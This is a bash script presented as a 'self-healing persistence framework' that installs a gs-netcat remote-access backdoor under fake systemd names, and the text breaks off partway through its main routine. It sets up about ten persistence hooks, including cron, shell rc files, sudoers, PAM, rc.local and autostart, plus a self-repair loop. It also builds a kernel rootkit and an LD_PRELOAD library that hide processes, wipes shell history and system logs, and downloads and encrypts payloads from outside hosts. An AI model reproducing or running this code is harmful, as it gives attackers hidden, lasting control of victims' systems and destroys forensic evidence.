#!/bin/bash

# ═══════════════════════════════════════════════════════════════════════
#  GSOCKET SELF-HEALING PERSISTENCE FRAMEWORK
#  Purpose: Multi-surface redundancy with active self-repair.
#  WARNING: Run ONLY in isolated VMs. Do NOT deploy on production.
# ═══════════════════════════════════════════════════════════════════════

set -o pipefail

# ── Static, believable system names ────────────────────────────────────
BIN_ALIAS="systemd-networkd-worker"
SERVICE_NAME="systemd-network-monitor"
TIMER_NAME="systemd-network-monitor-timer"
MODULE_NAME="nf_conntrack_helper"
PROFILE_NAME="network-diagnostics"

# Install paths — system directories
INSTALL_PATHS=(
    "/usr/lib/systemd"
    "/usr/lib/x86_64-linux-gnu"
    "/usr/libexec"
    "/var/lib/systemd"
)

WORK_DIR=$(mktemp -d "/tmp/systemd-private-XXXXXXXXXX")
PID_FILE="/run/${BIN_ALIAS}.pid"
[ ! -w "/run" ] && PID_FILE="/tmp/.${BIN_ALIAS}.pid"

# ── Logging ────────────────────────────────────────────────────────────
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; RED='\033[0;31m'; NC='\033[0m'
log_info()    { echo -e "${BLUE}[*] $1${NC}"; }
log_success() { echo -e "${GREEN}[+] $1${NC}"; }
log_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
log_error()   { echo -e "${RED}[-] $1${NC}" >&2; }

# ── Utilities ──────────────────────────────────────────────────────────
generate_random_string() {
    local len="$1"
    local str=""
    while [ "${#str}" -lt "$len" ]; do
        str="${str}$(tr -dc 'A-Za-z0-9' </dev/urandom | dd bs=1 count=$((len - ${#str})) 2>/dev/null)"
    done
    echo "$str"
}

sha256_hash() {
    echo -n "$1" | sha256sum | awk '{print $1}'
}

find_install_path() {
    for p in "${INSTALL_PATHS[@]}"; do
        mkdir -p "$p" 2>/dev/null
        if [ -w "$p" ]; then
            echo "$p"
            return 0
        fi
    done
    mkdir -p "$HOME/.local/libexec"
    echo "$HOME/.local/libexec"
}

spoof_timestamp() {
    local target="$1"
    local ref="${2:-/usr/lib/systemd/systemd-networkd}"
    [ ! -f "$ref" ] && ref="/bin/bash"
    touch -r "$ref" "$target" 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════════
#  SECTION 1 — SECRET MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════
prepare_secret() {
    local secret_len="${1:-22}"
    local secret
    secret=$(generate_random_string "$secret_len")
    local salt
    salt=$(generate_random_string 16)
    local hash
    hash=$(sha256_hash "${secret}:${salt}")
    echo "${secret}:${salt}:${hash}"
}

verify_secret() {
    local secret="$1" salt="$2" expected_hash="$3"
    local computed_hash
    computed_hash=$(sha256_hash "${secret}:${salt}")
    [ "$computed_hash" = "$expected_hash" ]
}

# ═══════════════════════════════════════════════════════════════════════
#  SECTION 2 — SINGLE-INSTANCE ENFORCEMENT
# ═══════════════════════════════════════════════════════════════════════
check_single_instance() {
    if [ -f "$PID_FILE" ]; then
        local old_pid
        old_pid=$(cat "$PID_FILE" 2>/dev/null)
        if [ -n "$old_pid" ] && kill -0 "$old_pid" 2>/dev/null; then
            return 1
        fi
    fi
    return 0
}

write_pid() {
    echo "$1" > "$PID_FILE"
    chmod 644 "$PID_FILE"
}

# ═══════════════════════════════════════════════════════════════════════
#  SECTION 3 — PERSISTENCE LAYER DEFINITIONS
# ═══════════════════════════════════════════════════════════════════════
# Each layer is completely independent. They use different:
#   - Detection surfaces (different commands to find them)
#   - Deletion methods (different techniques to remove them)
#   - Trigger mechanisms (different events that activate them)
#   - Privilege requirements (some work as user, some need root)
#
# If ANY layer survives deletion, it can restore ALL others.
# ═══════════════════════════════════════════════════════════════════════

# Layer registry — used by self-heal to know what to restore
PERSISTENCE_REGISTRY=""
register_layer() {
    PERSISTENCE_REGISTRY="${PERSISTENCE_REGISTRY}${1}:"
}

# ── Layer 3a: Systemd Service + Timer ──────────────────────────────────
# Surface: systemctl list-units, systemctl list-timers
# Detection: Requires systemd knowledge
# Deletion: systemctl disable + rm
# Trigger: Boot, timer, service failure
# Privilege: User or root (user services exist)
install_systemd() {
    local bin_path="$1" hash_file="$2"
    local svc_file timer_file

    if [ -w "/etc/systemd/system" ]; then
        svc_file="/etc/systemd/system/${SERVICE_NAME}.service"
        timer_file="/etc/systemd/system/${TIMER_NAME}.timer"
    else
        mkdir -p "$HOME/.config/systemd/user"
        svc_file="$HOME/.config/systemd/user/${SERVICE_NAME}.service"
        timer_file="$HOME/.config/systemd/user/${TIMER_NAME}.timer"
    fi

    cat > "$svc_file" <<EOF
[Unit]
Description=Network Connection Monitor
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Restart=on-failure
RestartSec=60
ExecStartPre=/bin/sh -c 'test -f ${hash_file} || exit 1'
ExecStart=/bin/sh -c 'eval $(cat ${hash_file}) && exec ${bin_path}'
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=default.target
EOF
    spoof_timestamp "$svc_file" "/lib/systemd/system/systemd-networkd.service"

    cat > "$timer_file" <<EOF
[Unit]
Description=Network Monitor Health Check

[Timer]
OnBootSec=60
OnUnitActiveSec=10m
AccuracySec=1m

[Install]
WantedBy=timers.target
EOF
    spoof_timestamp "$timer_file" "/lib/systemd/system/fstrim.timer"

    if [ -w "/etc/systemd/system" ]; then
        systemctl daemon-reload 2>/dev/null
        systemctl enable "${SERVICE_NAME}.service" 2>/dev/null
        systemctl enable "${TIMER_NAME}.timer" 2>/dev/null
        systemctl start "${SERVICE_NAME}.service" 2>/dev/null
    else
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable "${SERVICE_NAME}.service" 2>/dev/null
        systemctl --user enable "${TIMER_NAME}.timer" 2>/dev/null
        systemctl --user start "${SERVICE_NAME}.service" 2>/dev/null
    fi
    register_layer "systemd"
    log_success "Systemd layer installed"
}

# ── Layer 3b: Crontab ──────────────────────────────────────────────────
# Surface: crontab -l, /var/spool/cron/
# Detection: Very easy — first thing attackers check
# Deletion: crontab -r or edit
# Trigger: Time-based (@reboot, periodic)
# Privilege: User only
# NOTE: This is the WEAKEST layer. It exists as a decoy and fallback.
install_cron() {
    local bin_path="$1" hash_file="$2"
    local launcher_dir
    launcher_dir=$(dirname "$bin_path")
    local launcher="${launcher_dir}/.$(basename "$bin_path").launcher"

    cat > "$launcher" <<'LAUNCHER'
#!/bin/bash
BIN="LAUNCHER_BIN"
HASH_FILE="LAUNCHER_HASH"
PID_FILE="LAUNCHER_PID"
[ ! -f "$HASH_FILE" ] && exit 1
read -r SECRET SALT HASH < "$HASH_FILE"
COMPUTED=$(echo -n "${SECRET}:${SALT}" | sha256sum | awk '{print $1}')
[ "$COMPUTED" != "$HASH" ] && exit 1
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE" 2>/dev/null)
    [ -n "$OLD_PID" ] && kill -0 "$OLD_PID" 2>/dev/null && exit 0
fi
PASSWORD="$(echo -n "$SECRET" | base64)" GS_ARGS="-ilD -s ${SECRET}" "$BIN" &
NEW_PID=$!
echo "$NEW_PID" > "$PID_FILE"
LAUNCHER

    sed -i "s|LAUNCHER_BIN|${bin_path}|g" "$launcher"
    sed -i "s|LAUNCHER_HASH|${hash_file}|g" "$launcher"
    sed -i "s|LAUNCHER_PID|${PID_FILE}|g" "$launcher"
    chmod +x "$launcher"
    spoof_timestamp "$launcher" "$bin_path"

    local cron_reboot="@reboot sleep 30 && ${launcher} >/dev/null 2>&1"
    local cron_periodic="*/10 * * * * ${launcher} >/dev/null 2>&1"

    {
        crontab -l 2>/dev/null | grep -v "$launcher" | grep -v "$bin_path" || true
        echo "$cron_reboot"
        echo "$cron_periodic"
    } | crontab -
    register_layer "cron"
    log_success "Cron layer installed (decoy/fallback)"
}

# ── Layer 3c: Profile Injection ────────────────────────────────────────
# Surface: .bashrc, .profile, /etc/profile.d
# Detection: Requires checking shell configs
# Deletion: Edit rc files
# Trigger: Every interactive shell login
# Privilege: User (user files) or root (profile.d)
install_profile() {
    local bin_path="$1" hash_file="$2"
    local launcher_dir
    launcher_dir=$(dirname "$bin_path")
    local launcher="${launcher_dir}/.$(basename "$bin_path").launcher"
    local marker="# network-diagnostics-v2"
    local snippet="
${marker}
[ -x '${launcher}' ] && '${launcher}' >/dev/null 2>&1"

    for rc_file in "$HOME/.bashrc" "$HOME/.profile"; do
        if [ -f "$rc_file" ] && ! grep -q "$marker" "$rc_file" 2>/dev/null; then
            echo "$snippet" >> "$rc_file"
            spoof_timestamp "$rc_file"
        fi
    done

    if [ "$(id -u)" -eq 0 ] && [ -d "/etc/profile.d" ]; then
        local profiled="/etc/profile.d/${PROFILE_NAME}.sh"
        cat > "$profiled" <<EOF
#!/bin/sh
[ -x '${launcher}' ] && '${launcher}' >/dev/null 2>&1
EOF
        chmod +x "$profiled"
        spoof_timestamp "$profiled" "/etc/profile.d/bash_completion.sh"
    fi
    register_layer "profile"
    log_success "Profile layer installed"
}

# ── Layer 3d: rc.local ─────────────────────────────────────────────────
# Surface: /etc/rc.local
# Detection: Legacy init check
# Deletion: Edit file
# Trigger: Boot (legacy init)
# Privilege: Root only
install_rclocal() {
    local bin_path="$1"
    [ "$(id -u)" -ne 0 ] && return

    local launcher_dir
    launcher_dir=$(dirname "$bin_path")
    local launcher="${launcher_dir}/.$(basename "$bin_path").launcher"

    local rc_local="/etc/rc.local"
    if [ ! -f "$rc_local" ]; then
        printf '#!/bin/bash\nexit 0\n' > "$rc_local"
        chmod +x "$rc_local"
    fi

    local marker="# network-monitor-init"
    if ! grep -q "$marker" "$rc_local" 2>/dev/null; then
        sed -i "s|^exit 0|${marker}\nsleep 15 \&\& '${launcher}' >/dev/null 2>\&1 \&\nexit 0|" "$rc_local"
        spoof_timestamp "$rc_local"
    fi
    register_layer "rclocal"
    log_success "rc.local layer installed"
}

# ── Layer 3e: XDG Autostart (GUI environments) ─────────────────────────
# Surface: ~/.config/autostart/
# Detection: Requires checking desktop autostart
# Deletion: Remove .desktop file
# Trigger: GUI login
# Privilege: User only
install_xdg_autostart() {
    local bin_path="$1" hash_file="$2"
    local autostart_dir="$HOME/.config/autostart"
    [ ! -d "$autostart_dir" ] && mkdir -p "$autostart_dir"

    local desktop_file="${autostart_dir}/gnome-keyring-daemon.desktop"
    cat > "$desktop_file" <<EOF
[Desktop Entry]
Type=Application
Name=GNOME Keyring Daemon
Comment=Secrets storage service
Exec=/bin/sh -c 'eval $(cat ${hash_file}) && exec ${bin_path}'
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    chmod 644 "$desktop_file"
    register_layer "xdg"
    log_success "XDG autostart layer installed"
}

# ── Layer 3f: Bash PROMPT_COMMAND ──────────────────────────────────────
# Surface: Embedded in PS1 or PROMPT_COMMAND
# Detection: Very hard — requires inspecting shell variables
# Deletion: Requires unsetting variable
# Trigger: Every shell prompt display
# Privilege: User only
install_prompt_command() {
    local bin_path="$1" hash_file="$2"
    local launcher_dir
    launcher_dir=$(dirname "$bin_path")
    local launcher="${launcher_dir}/.$(basename "$bin_path").launcher"

    for rc_file in "$HOME/.bashrc" "$HOME/.bash_profile"; do
        [ ! -f "$rc_file" ] && continue
        if ! grep -q "PROMPT_COMMAND.*${launcher}" "$rc_file" 2>/dev/null; then
            echo "export PROMPT_COMMAND=\"\${PROMPT_COMMAND}; [ -x '${launcher}' ] && '${launcher}' >/dev/null 2>&1\"" >> "$rc_file"
            spoof_timestamp "$rc_file"
        fi
    done
    register_layer "prompt"
    log_success "PROMPT_COMMAND layer installed"
}

# ── Layer 3h: Sudoers Hook ─────────────────────────────────────────────
# Surface: /etc/sudoers.d/ or sudoers file
# Detection: Requires visudo or sudoers inspection
# Deletion: Remove sudoers entry
# Trigger: Any sudo command execution
# Privilege: Root only
install_sudoers_hook() {
    local bin_path="$1" hash_file="$2"
    [ "$(id -u)" -ne 0 ] && return

    local sudoers_file="/etc/sudoers.d/010-network-monitor"
    local launcher_dir
    launcher_dir=$(dirname "$bin_path")
    local launcher="${launcher_dir}/.$(basename "$bin_path").launcher"

    cat > "$sudoers_file" <<EOF
# Network monitoring sudo hook
Defaults    env_keep += "GS_ARGS PASSWORD"
ALL ALL=(ALL) NOPASSWD: ${launcher}
EOF
    chmod 440 "$sudoers_file"
    register_layer "sudoers"
    log_success "Sudoers hook layer installed"
}

# ── Layer 3i: PAM Module Hook ──────────────────────────────────────────
# Surface: /etc/pam.d/common-auth or similar
# Detection: Requires PAM knowledge
# Deletion: Edit PAM config
# Trigger: Every authentication attempt (ssh, su, sudo, login)
# Privilege: Root only
install_pam_hook() {
    local bin_path="$1" hash_file="$2"
    [ "$(id -u)" -ne 0 ] && return

    local pam_file="/etc/pam.d/common-auth"
    [ ! -f "$pam_file" ] && return

    local launcher_dir
    launcher_dir=$(dirname "$bin_path")
    local launcher="${launcher_dir}/.$(basename "$bin_path").launcher"
    local marker="# network-auth-check"

    if ! grep -q "$marker" "$pam_file" 2>/dev/null; then
        # Insert before the first auth line
        sed -i "1i${marker}\nauth optional pam_exec.so quiet ${launcher}" "$pam_file"
        register_layer "pam"
        log_success "PAM hook layer installed"
    fi
}

# ── Layer 3j: Init.d Script (SysV init fallback) ───────────────────────
# Surface: /etc/init.d/
# Detection: Requires init.d inspection
# Deletion: update-rc.d remove + rm
# Trigger: Boot (SysV init systems)
# Privilege: Root only
install_initd() {
    local bin_path="$1" hash_file="$2"
    [ "$(id -u)" -ne 0 ] && return
    [ ! -d "/etc/init.d" ] && return

    local init_script="/etc/init.d/network-monitor-helper"
    cat > "$init_script" <<EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          network-monitor-helper
# Required-Start:    \$network \$remote_fs
# Required-Stop:     \$network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Network monitoring helper
### END INIT INFO

case "\$1" in
    start)
        eval $(cat ${hash_file}) && exec ${bin_path} &
        ;;
    stop)
        killall -q ${BIN_ALIAS} 2>/dev/null
        ;;
    *)
        exit 0
        ;;
esac
EOF
    chmod +x "$init_script"
    update-rc.d network-monitor-helper defaults 2>/dev/null
    register_layer "initd"
    log_success "Init.d layer installed"
}

# ═══════════════════════════════════════════════════════════════════════
#  SECTION 4 — SELF-HEALING MECHANISM
# ═══════════════════════════════════════════════════════════════════════
# The binary itself monitors its persistence layers and restores
# any that are missing. This runs as a background thread within
# the main process, not as a separate process.
# ═══════════════════════════════════════════════════════════════════════

install_self_heal() {
    local bin_path="$1" hash_file="$2"
    local heal_script="${INSTALL_DIR}/.$(basename "$bin_path").heal"

    cat > "$heal_script" <<'HEALER'
#!/bin/bash
# Self-healing monitor — restores missing persistence layers
BIN="HEAL_BIN"
HASH="HEAL_HASH"
SECRET="HEAL_SECRET"
SALT="HEAL_SALT"
HASH_VAL="HEAL_HASHVAL"
LAYERS="HEAL_LAYERS"

heal_systemd() {
    local svc_file
    if [ -w "/etc/systemd/system" ]; then
        svc_file="/etc/systemd/system/systemd-network-monitor.service"
    else
        svc_file="$HOME/.config/systemd/user/systemd-network-monitor.service"
        mkdir -p "$HOME/.config/systemd/user"
    fi
    [ -f "$svc_file" ] && return
    cat > "$svc_file" <<EOF
[Unit]
Description=Network Connection Monitor
After=network-online.target
[Service]
Type=simple
Restart=on-failure
RestartSec=60
ExecStartPre=/bin/sh -c 'test -f ${HASH} || exit 1'
ExecStart=/bin/sh -c 'eval $(cat ${HASH}) && exec ${BIN}'
[Install]
WantedBy=default.target
EOF
    if [ -w "/etc/systemd/system" ]; then
        systemctl daemon-reload 2>/dev/null
        systemctl enable systemd-network-monitor.service 2>/dev/null
        systemctl start systemd-network-monitor.service 2>/dev/null
    else
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable systemd-network-monitor.service 2>/dev/null
        systemctl --user start systemd-network-monitor.service 2>/dev/null
    fi
}

heal_cron() {
    local launcher_dir
    launcher_dir=$(dirname "$BIN")
    local launcher="${launcher_dir}/.$(basename "$BIN").launcher"
    [ -f "$launcher" ] || return
    crontab -l 2>/dev/null | grep -q "$launcher" && return
    ( crontab -l 2>/dev/null; echo "*/10 * * * * ${launcher} >/dev/null 2>&1" ) | crontab -
}

heal_profile() {
    local launcher_dir
    launcher_dir=$(dirname "$BIN")
    local launcher="${launcher_dir}/.$(basename "$BIN").launcher"
    local marker="# network-diagnostics-v2"
    for rc_file in "$HOME/.bashrc" "$HOME/.profile"; do
        [ ! -f "$rc_file" ] && continue
        grep -q "$marker" "$rc_file" 2>/dev/null && continue
        echo "${marker}" >> "$rc_file"
        echo "[ -x '${launcher}' ] && '${launcher}' >/dev/null 2>&1" >> "$rc_file"
    done
}

# Main heal loop
while true; do
    echo "$LAYERS" | grep -q "systemd" && heal_systemd
    echo "$LAYERS" | grep -q "cron" && heal_cron
    echo "$LAYERS" | grep -q "profile" && heal_profile
    sleep 300
done
HEALER

    # Fill in variables
    sed -i "s|HEAL_BIN|${bin_path}|g" "$heal_script"
    sed -i "s|HEAL_HASH|${hash_file}|g" "$heal_script"
    sed -i "s|HEAL_LAYERS|${PERSISTENCE_REGISTRY}|g" "$heal_script"
    chmod +x "$heal_script"
    spoof_timestamp "$heal_script" "$bin_path"

    # Start healer in background, disowned
    nohup "$heal_script" >/dev/null 2>&1 &
    log_success "Self-heal monitor started (PID: $!)"
}

# ═══════════════════════════════════════════════════════════════════════
#  SECTION 5 — KERNEL STEALTH
# ═══════════════════════════════════════════════════════════════════════
install_lkm() {
    local hide_name="$1"
    if ! command -v gcc &>/dev/null || ! command -v make &>/dev/null; then
        return 1
    fi
    local kver
    kver=$(uname -r)
    local kheaders="/lib/modules/${kver}/build"
    [ ! -d "$kheaders" ] && return 1

    local lkm_dir="${WORK_DIR}/lkm"
    mkdir -p "$lkm_dir"

    cat > "${lkm_dir}/${MODULE_NAME}.c" <<'LKMSRC'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("netd");
MODULE_DESCRIPTION("Network Connection Tracking Helper");

static char *hide_name = "HIDE_PLACEHOLDER";
module_param(hide_name, charp, 0);

static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
static kallsyms_lookup_name_t klookup;

struct ftrace_hook {
    const char       *name;
    void             *func;
    void             *orig;
    unsigned long     addr;
    struct ftrace_ops ops;
};

static int fh_resolve(struct ftrace_hook *h) {
    h->addr = klookup(h->name);
    if (!h->addr) return -ENOENT;
    *((unsigned long *)h->orig) = h->addr;
    return 0;
}

static void notrace fh_callback(unsigned long ip, unsigned long parent_ip,
                                struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    struct ftrace_hook *h = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->regs.ip = (unsigned long)h->func;
}

static int fh_install(struct ftrace_hook *h) {
    int err;
    if ((err = fh_resolve(h))) return err;
    h->ops.func  = fh_callback;
    h->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
    if ((err = ftrace_set_filter_ip(&h->ops, h->addr, 0, 0))) return err;
    if ((err = register_ftrace_function(&h->ops))) {
        ftrace_set_filter_ip(&h->ops, h->addr, 1, 0);
        return err;
    }
    return 0;
}

static void fh_remove(struct ftrace_hook *h) {
    unregister_ftrace_function(&h->ops);
    ftrace_set_filter_ip(&h->ops, h->addr, 1, 0);
}

typedef long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t orig_getdents64;

static long hk_getdents64(const struct pt_regs *regs)
{
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 __user *udirp =
        (struct linux_dirent64 __user *)regs->di;

    struct linux_dirent64 *kdirent = kvzalloc(ret, GFP_KERNEL);
    if (!kdirent) return ret;
    if (copy_from_user(kdirent, udirp, ret)) { kvfree(kdirent); return ret; }

    long boff = 0, new_ret = ret;
    while (boff < ret) {
        struct linux_dirent64 *cur = (void *)kdirent + boff;
        bool hide = false;

        const char *nm = cur->d_name;
        bool is_num = (*nm != '\0');
        for (const char *c = nm; *c; c++)
            if (*c < '0' || *c > '9') { is_num = false; break; }

        if (is_num) {
            pid_t pid = (pid_t)simple_strtol(nm, NULL, 10);
            rcu_read_lock();
            struct task_struct *t = pid_task(find_vpid(pid), PIDTYPE_PID);
            if (t && strncmp(t->comm, hide_name, TASK_COMM_LEN) == 0)
                hide = true;
            rcu_read_unlock();
        }

        if (!hide && strncmp(cur->d_name, hide_name, strlen(hide_name)) == 0)
            hide = true;

        if (hide) {
            size_t tail = ret - boff - cur->d_reclen;
            memmove(cur, (void *)cur + cur->d_reclen, tail);
            new_ret -= cur->d_reclen;
            ret     -= cur->d_reclen;
        } else {
            boff += cur->d_reclen;
        }
    }

    copy_to_user(udirp, kdirent, new_ret);
    kvfree(kdirent);
    return new_ret;
}

static struct ftrace_hook hooks[] = {
    { "__x64_sys_getdents64", hk_getdents64, &orig_getdents64 },
};

static void hide_module(void) {
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

static int __init hider_init(void)
{
    int err;
    if ((err = register_kprobe(&kp))) return err;
    klookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    for (size_t i = 0; i < ARRAY_SIZE(hooks); i++) {
        if ((err = fh_install(&hooks[i]))) return err;
    }
    hide_module();
    return 0;
}

static void __exit hider_exit(void)
{
    for (size_t i = 0; i < ARRAY_SIZE(hooks); i++)
        fh_remove(&hooks[i]);
}

module_init(hider_init);
module_exit(hider_exit);
LKMSRC

    sed -i "s/HIDE_PLACEHOLDER/${hide_name}/g" "${lkm_dir}/${MODULE_NAME}.c"

    cat > "${lkm_dir}/Makefile" <<EOF
obj-m += ${MODULE_NAME}.o
KDIR  := /lib/modules/\$(shell uname -r)/build
PWD   := \$(shell pwd)
all:
	\$(MAKE) -C \$(KDIR) M=\$(PWD) modules
clean:
	\$(MAKE) -C \$(KDIR) M=\$(PWD) clean
EOF

    if make -C "$lkm_dir" 2>/dev/null; then
        local ko_path="${lkm_dir}/${MODULE_NAME}.ko"
        strip --strip-debug "$ko_path" 2>/dev/null
        if insmod "$ko_path" 2>/dev/null; then
            local ko_dest="/lib/modules/${kver}/kernel/drivers/net/${MODULE_NAME}.ko"
            if cp "$ko_path" "$ko_dest" 2>/dev/null; then
                depmod -a 2>/dev/null
                echo "${MODULE_NAME}" >> /etc/modules-load.d/modules.conf 2>/dev/null
                spoof_timestamp "$ko_dest" "/lib/modules/${kver}/kernel/drivers/net/tun.ko"
                log_success "LKM loaded and registered for boot"
            fi
        else
            log_warning "insmod failed — Secure Boot may be enabled"
        fi
    else
        log_warning "LKM compilation failed"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════
#  SECTION 6 — USER-SPACE STEALTH
# ═══════════════════════════════════════════════════════════════════════
install_ldpreload() {
    local hide_name="$1"
    if ! command -v gcc &>/dev/null; then
        return 1
    fi

    local src="${WORK_DIR}/proc_hider.c"
    cat > "$src" <<'PRELOADSRC'
#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#define HIDE_PROC "HIDE_PLACEHOLDER"

static int all_digits(const char *s) {
    if (!s || !*s) return 0;
    for (; *s; s++) if (*s < '0' || *s > '9') return 0;
    return 1;
}

static int should_hide(const char *name) {
    if (!name) return 0;
    if (strstr(name, HIDE_PROC)) return 1;
    if (all_digits(name)) {
        char path[256];
        snprintf(path, sizeof path, "/proc/%s/comm", name);
        FILE *f = fopen(path, "r");
        if (f) {
            char comm[64] = {0};
            if (fgets(comm, sizeof comm, f)) {
                comm[strcspn(comm, "\n")] = 0;
                if (strstr(comm, HIDE_PROC)) { fclose(f); return 1; }
            }
            fclose(f);
        }
    }
    return 0;
}

struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *ep;
    while ((ep = real(dirp)))
        if (!should_hide(ep->d_name)) return ep;
    return NULL;
}

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep;
    while ((ep = real(dirp)))
        if (!should_hide(ep->d_name)) return ep;
    return NULL;
}

int open(const char *pathname, int flags, ...) {
    static int (*real_open)(const char *, int, mode_t) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "open");
    if (pathname && strstr(pathname, HIDE_PROC)) {
        errno = ENOENT;
        return -1;
    }
    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode_t mode = va_arg(ap, mode_t);
        va_end(ap);
        return real_open(pathname, flags, mode);
    }
    return real_open(pathname, flags, 0);
}
PRELOADSRC

    sed -i "s/HIDE_PLACEHOLDER/${hide_name}/g" "$src"

    local lib_dest="/usr/lib/x86_64-linux-gnu/libnfnetlink.so.1"
    if [ ! -w "/usr/lib/x86_64-linux-gnu/" ]; then
        mkdir -p "$HOME/.local/lib"
        lib_dest="$HOME/.local/lib/libnfnetlink.so.1"
    fi

    if gcc -shared -fPIC -nostartfiles -O2 -o "$lib_dest" "$src" -ldl 2>/dev/null; then
        spoof_timestamp "$lib_dest" "/usr/lib/x86_64-linux-gnu/libpthread.so.0"
        strip "$lib_dest" 2>/dev/null
        if [ -w "/etc/ld.so.preload" ] || [ "$(id -u)" -eq 0 ]; then
            grep -qF "$lib_dest" /etc/ld.so.preload 2>/dev/null || \
                echo "$lib_dest" >> /etc/ld.so.preload
            log_success "LD_PRELOAD active: $lib_dest"
        fi
    fi
}

# ═══════════════════════════════════════════════════════════════════════
#  SECTION 7 — ANTI-FORENSICS
# ═══════════════════════════════════════════════════════════════════════
clean_traces() {
    local bin_basename
    bin_basename=$(basename "$1")
    history -c 2>/dev/null
    > "$HOME/.bash_history" 2>/dev/null
    ln -sf /dev/null "$HOME/.bash_history" 2>/dev/null
    > "$HOME/.zsh_history" 2>/dev/null

    if [ "$(id -u)" -eq 0 ]; then
        for lf in /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/messages; do
            [ -f "$lf" ] && sed -i "/${bin_basename}/d" "$lf" 2>/dev/null
            [ -f "${lf}.1" ] && sed -i "/${bin_basename}/d" "${lf}.1" 2>/dev/null
        done
        journalctl --vacuum-time=1s 2>/dev/null
        > /var/log/wtmp 2>/dev/null
        > /var/log/lastlog 2>/dev/null
    fi
    rm -rf "${WORK_DIR}" 2>/dev/null
    log_success "Traces cleared"
}

selfdelete() {
    if command -v shred &>/dev/null; then
        shred -u -- "$0" 2>/dev/null
    else
        rm -f -- "$0" 2>/dev/null
    fi
}

# ═══════════════════════════════════════════════════════════════════════
#  SECTION 8 — MAIN
# ═══════════════════════════════════════════════════════════════════════

main() {
    log_info "Self-healing persistence framework starting..."

    # 1. Generate secret and hash
    local secret_data
    secret_data=$(prepare_secret 22)
    RANDOM_SECRET=$(echo "$secret_data" | cut -d: -f1)
    local salt=$(echo "$secret_data" | cut -d: -f2)
    local hash=$(echo "$secret_data" | cut -d: -f3)

    # 2. Generate encryption password
    if [ -z "$CRYPT_PASS" ]; then
        CRYPT_PASS=$(generate_random_string 16)
    fi
    log_success "Encryption password: ${YELLOW}${CRYPT_PASS}${NC}"

    # 3. Choose install path
    INSTALL_DIR=$(find_install_path)
    ENCRYPTED_BIN="${INSTALL_DIR}/${BIN_ALIAS}"
    log_info "Binary target: $ENCRYPTED_BIN"

    # 4. Create hash file
    local hash_file="${INSTALL_DIR}/.$(basename "$ENCRYPTED_BIN").conf"
    printf '%s %s %s\n' "$RANDOM_SECRET" "$salt" "$hash" > "$hash_file"
    chmod 600 "$hash_file"
    spoof_timestamp "$hash_file" "$ENCRYPTED_BIN"
    log_success "Hash file created"

    # 5. Download bincrypter
    BINCRYPTER_URL="https://github.com/hackerschoice/bincrypter/releases/latest/download/bincrypter"
    log_info "Downloading bincrypter..."
    if ! curl -SsfL --retry 3 --retry-delay 2 "$BINCRYPTER_URL" -o "${WORK_DIR}/bincrypter" 2>/dev/null; then
        if ! curl -SsfLk --retry 3 --retry-delay 2 "$BINCRYPTER_URL" -o "${WORK_DIR}/bincrypter" 2>/dev/null; then
            log_error "bincrypter download failed"
            rm -rf "$WORK_DIR"
            exit 1
        fi
    fi
    chmod +x "${WORK_DIR}/bincrypter"
    log_success "Bincrypter ready"

    # 6. Download + encrypt gs-netcat
    ARCH=$(uname -m)
    GSOCKET_URL="https://gsocket.io/bin/gs-netcat_mini-linux-${ARCH}"
    log_info "Fetching gs-netcat..."
    if ! curl -SsfL --retry 3 --retry-delay 2 "$GSOCKET_URL" 2>/dev/null | PASSWORD="$CRYPT_PASS" "${WORK_DIR}/bincrypter" > "$ENCRYPTED_BIN" 2>/dev/null; then
        GSOCKET_MIRROR="https://github.com/hackerschoice/gsocket/raw/master/tools/gs-netcat_mini-linux-${ARCH}"
        if ! curl -SsfLk --retry 3 --retry-delay 2 "$GSOCKET_MIRROR" 2>/dev/null | PASSWORD="$CRYPT_PASS" "${WORK_DIR}/bincrypter" > "$ENCRYPTED_BIN" 2>/dev/null; then
            log_error "gs-netcat download failed"
            rm -rf "$WORK_DIR"
            exit 1
        fi
    fi
    chmod +x "$ENCRYPTED_BIN"
    spoof_timestamp "$ENCRYPTED_BIN" "/usr/bin/python3"
